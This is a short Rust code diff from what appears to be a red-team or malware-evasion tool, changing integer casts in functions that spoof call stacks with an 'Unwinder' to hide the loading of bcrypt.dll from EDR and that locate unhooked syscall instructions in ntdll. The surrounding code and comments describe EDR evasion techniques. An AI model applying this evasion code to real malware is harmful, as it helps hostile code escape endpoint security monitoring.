@@ -140,7 +140,7 @@ fn fluctuate_core(config_encryptall: bool, config_delay: Option<u32>, event_hand
 
         // Use Unwinder to create a clean call stack before loading bcrypt.dll. This way, the call stack won't be a problem
         // when the LoadImage callback is analyzed by the EDR.
-        let bcrypt = unwinder::call_function!(load_library_address, false, name.as_ptr() as *mut u8) as isize;
+        let bcrypt = unwinder::call_function!(load_library_address, false, name.as_ptr() as *mut u8) as usize;
         if bcrypt == 0
         {
             return Err(lc!("[X] Error loading bcrypt into the current process."));
@@ -231,10 +231,10 @@ fn fluctuate_core(config_encryptall: bool, config_delay: Option<u32>, event_hand
 
         // Check if functions were succesfully found
         if ntprotectvm_address != ptr::null_mut() {
-            syscall_addr1 = get_syscall_addr(ntprotectvm_address as isize);
+            syscall_addr1 = get_syscall_addr(ntprotectvm_address as usize);
         }
         if ntwaitobj_address != ptr::null_mut() {
-            syscall_addr2 = get_syscall_addr(ntwaitobj_address as isize);
+            syscall_addr2 = get_syscall_addr(ntwaitobj_address as usize);
         }
 
         // If the original syscall instruction is hooked/not found, then get a random one
@@ -833,7 +833,7 @@ fn get_pe_metadata (module_ptr: *const u8) -> Result<PeMetadata,String> {
     }
 }
 
-fn get_syscall_addr (base_address: isize) -> usize {
+fn get_syscall_addr (base_address: usize) -> usize {
 
     let syscall_hex: [u8; 3] = [0x0f, 0x05, 0xC3];
     let offset;
